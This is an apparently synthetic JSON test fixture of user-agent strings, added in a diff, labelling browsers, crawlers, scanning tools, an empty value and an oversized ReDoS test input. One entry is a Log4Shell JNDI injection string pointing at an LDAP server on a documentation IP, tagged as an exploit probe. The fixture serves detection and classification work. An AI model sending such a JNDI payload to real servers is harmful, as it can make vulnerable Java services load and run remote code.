@@ -1,0 +1,104 @@
+{
+ "_synthetic": "UA strings written for P317-FC5 (browser, bots, scanners, research scanners, a Log4Shell probe with a documentation IP, empty, and a > 1 KB ReDoS candidate)",
+ "uas": [
+  {
+   "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+   "category": "browser",
+   "browser": "Chrome",
+   "os": "Windows",
+   "device": "desktop"
+  },
+  {
+   "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
+   "category": "browser",
+   "browser": "Edge",
+   "os": "Windows",
+   "device": "desktop"
+  },
+  {
+   "ua": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
+   "category": "browser",
+   "browser": "Safari",
+   "os": "iOS",
+   "device": "mobile"
+  },
+  {
+   "ua": "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/26.0 Chrome/122.0.0.0 Mobile Safari/537.36",
+   "category": "browser",
+   "browser": "Samsung Internet",
+   "os": "Android",
+   "device": "mobile"
+  },
+  {
+   "ua": "Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0",
+   "category": "browser",
+   "browser": "Firefox",
+   "os": "Linux",
+   "device": "desktop"
+  },
+  {
+   "ua": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
+   "category": "bot",
+   "tool": "Googlebot",
+   "device": "bot"
+  },
+  {
+   "ua": "WhatsApp/2.24.25.78 A",
+   "category": "bot",
+   "tool": "WhatsApp link preview",
+   "device": "bot"
+  },
+  {
+   "ua": "curl/8.5.0",
+   "category": "automation",
+   "tool": "curl",
+   "device": "bot"
+  },
+  {
+   "ua": "sqlmap/1.8.11#stable (https://sqlmap.org)",
+   "category": "scanner",
+   "tool": "sqlmap"
+  },
+  {
+   "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Nuclei - Open-source project (github.com/projectdiscovery/nuclei)",
+   "category": "scanner",
+   "tool": "Nuclei"
+  },
+  {
+   "ua": "masscan/1.3 (https://github.com/robertdavidgraham/masscan)",
+   "category": "scanner",
+   "tool": "masscan"
+  },
+  {
+   "ua": "Mozilla/5.0 zgrab/0.x",
+   "category": "scanner",
+   "tool": "ZGrab"
+  },
+  {
+   "ua": "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)",
+   "category": "benign_scanner",
+   "tool": "Censys"
+  },
+  {
+   "ua": "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day",
+   "category": "benign_scanner",
+   "tool": "Palo Alto Cortex Xpanse"
+  },
+  {
+   "ua": "${jndi:ldap://198.51.100.7:1389/a}",
+   "category": "scanner",
+   "tool": "Log4Shell probe",
+   "exploit_probe": "log4shell_jndi"
+  },
+  {
+   "ua": "",
+   "category": "empty"
+  },
+  {
+   "ua": "Mozilla/5.0 (compatible; aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa)",
+   "category": "unknown",
+   "truncated": true,
+   "note": "pathological ReDoS candidate: > 1 KB, truncated before matching"
+  }
+ ]
+}
